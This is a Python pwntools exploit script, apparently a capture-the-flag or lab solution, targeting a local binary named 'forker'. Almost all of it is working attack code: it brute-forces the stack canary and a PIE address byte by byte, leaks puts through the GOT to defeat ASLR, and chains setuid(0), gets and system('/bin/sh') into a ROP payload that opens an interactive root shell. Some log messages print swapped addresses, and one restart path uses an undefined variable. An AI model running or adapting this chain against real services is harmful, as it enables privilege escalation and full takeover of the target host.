#!/bin/python3

from pwn import *
from time import sleep


# generic brute forcer
def brute_force(target, buf, test, found, p):
    for i in range(0x100):
        if chr(i) == '\n':
            continue

        target.sendline(buf + p8(i))
        res = target.recv()

        if test(res):

            for check in range(10):
                p.status(f"Checking {buf[-found:] + p8(i)} ... {check+1} of 10")
                target.sendline(buf + p8(i))

                # give it time to respond
                sleep(0.5)
                res = target.recv()

                if not test(res):
                   return buf 

            return buf + p8(i)

        p.status(f"found {found} of 8 {buf[-found:] + p8(i)}")
        res2 = target.recv()

    return None

def main():

    # run binary 
    t = process("./forker")
    p = log.progress("Brute forcing canary ")
    
    # overflow > 24 bytes
    buf = b"A"*24
    
    # brute force cannary
    canary_test = lambda x: "stack" not in str(x)
    while True:
        buf = brute_force(t, buf, canary_test, len(buf[24:]), p)
    
        if buf == None:
            p.failure("Somthing went wrong, restarting")
            buf = restart
            p = log.progress("Brute forcing PIE    ")
    
        if buf == None:
            p.failure("Somthing went wrong")
            exit()
    
        if len(buf[24:]) >= 8:
            p.success(f"Cannary is {hex(u64(buf[-8:]))}")
            break
    
    
    # first payload with canary, padding, and no() offset
    restart = pay = buf + b"\0"*8 + b"\x99" 
    p = log.progress("Brute forcing PIE    ")
    
    # brute force the address of no()
    PIE_test = lambda x: ">:(" in str(x)
    while True:
        pay = brute_force(t, pay, PIE_test, len(pay[40:]), p)
    
        if pay == None:
            p.failure("Somthing went wrong")
            pay = restart
            p = log.progress("Brute forcing PIE    ")
    
    
        if len(pay[40:]) >= 8:
            p.success(f"Broke PIE! {hex(u64(pay[-8:]))} -> no()")
            break
    
    # offsets from no_function
    ret_rdi_oset  = 0x14a 
    ret_rsi_oset  = 0x148 
    puts_plt_oset = -0x159
    puts_GOT_oset = 0x2e87
    
    # offsets from puts libc
    sys_libc_oset    = -0x2ccd0
    setuid_libc_oset = 0x55ea0
    gets_libc_oset   = -0xa80
    
    # split payload and function address
    basic, real_no = pay[:-8], pay[-8:]
    
    # calcualte code section (.text) offsets from function
    pop_rdi  = p64(u64(real_no) + ret_rdi_oset)
    pop_rsi  = p64(u64(real_no) + ret_rsi_oset)
    puts_plt = p64(u64(real_no) + puts_plt_oset)
    puts_GOT = p64(u64(real_no) + puts_GOT_oset)
    writable = p64(u64(real_no) + puts_GOT_oset + 0x100)
    log.success(f"puts function plt address : {hex(u64(puts_plt))}")
    log.success(f"puts function GOT address : {hex(u64(puts_GOT))}")
    
    # payload 2
    leak_puts =  basic 
    leak_puts += pop_rdi 
    leak_puts += puts_GOT 
    leak_puts += puts_plt
    
    # try call puts to with GOT entry to get its libc address
    log.info("Calling puts plt with:\n\t rdi = puts GOT")
    log.info("Should respond with puts real libc address")
    t.sendline(leak_puts)
    sleep(1)
    
    # split response (possible race condition)
    echo, puts_libc, fluff = t.recv(len(leak_puts)+1), t.recvuntil(b'\n'), t.recv()
    
    # puts removes the null bytes from itself, put them back
    puts_libc = puts_libc.strip(b'\n')
    puts_libc += b"\0"*(8-len(puts_libc))
    log.success(f"puts libc = {hex(u64(puts_libc))}")
    log.success(f"Broke ASLR!")
    
    
    # calculate libc address' from leaked puts
    sys_libc     = p64(u64(puts_libc) + sys_libc_oset)
    setuid_libc  = p64(u64(puts_libc) + setuid_libc_oset)
    gets_libc    = p64(u64(puts_libc) + gets_libc_oset)
    log.success(f"gets libc address   : {hex(u64(sys_libc))}")
    log.success(f"setuid libc address : {hex(u64(setuid_libc))}")
    log.success(f"system libc address : {hex(u64(gets_libc))}")
    
    # final exploit
    log.info("Call setuid with:\n\t rdi = 0") 
    root_shell  = basic
    root_shell += pop_rdi 
    root_shell += b"\0"*8 
    root_shell += setuid_libc 
    log.info("Call gets with:\n\t rdi -> known writeable address") 
    root_shell += pop_rdi 
    root_shell += writable
    root_shell += gets_libc 
    log.info("Call system with:\n\t rdi -> known writeable address (now containing /bin/sh)") 
    root_shell += pop_rdi 
    root_shell += writable
    root_shell += sys_libc
    
    # send payload 3
    t.sendline(root_shell)
    
    # gets /bin/sh into memory
    log.info("Send /bin/sh to gets")
    t.sendline(b"/bin/sh\x00")
    
    # test shell 
    t.recv(timeout=0.5)
    t.sendline(b"whoami")
    user = str(t.recv(timeout=0.5))[2:-3]
    log.success(f"You got a shell with username '{user}'!")
    
    # give shell
    t.interactive()


if "__main__" in __name__:
    main()




